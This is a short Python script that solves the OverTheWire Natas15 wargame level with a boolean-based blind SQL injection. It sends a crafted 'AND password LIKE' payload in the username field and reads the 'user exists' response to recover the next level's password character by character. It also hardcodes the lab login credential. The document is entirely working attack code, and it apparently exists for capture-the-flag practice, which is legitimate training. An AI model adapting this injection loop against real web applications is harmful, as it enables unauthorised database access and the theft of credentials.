#!/usr/bin/env python3
import requests
import string
import time

URL = "http://natas15.natas.labs.overthewire.org/index.php"
AUTH = ("natas15", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

TRUE_STRING = "This user exists."
CHARSET = string.ascii_letters + string.digits
MAX_LEN = 32
DELAY = 0.0


def check_prefix(prefix):
    payload = f'natas16" AND password LIKE "{prefix}%" -- '

    r = requests.post(
        URL,
        auth=AUTH,
        data={"username": payload},
        timeout=10
    )

    return TRUE_STRING in r.text


def extract_password():
    extracted = ""
    print("[*] Starting Natas15 extraction...\n")

    for pos in range(1, MAX_LEN + 1):
        found = False

        for ch in CHARSET:
            attempt = extracted + ch
            if check_prefix(attempt):
                extracted += ch
                print(f"[+] Position {pos}: {ch}  →  {extracted}")
                found = True
                break

            if DELAY:
                time.sleep(DELAY)

        if not found:
            print("[!] No further characters found.")
            break

    print("\n[✓] Password recovered:")
    print(extracted)


if __name__ == "__main__":
    extract_password()
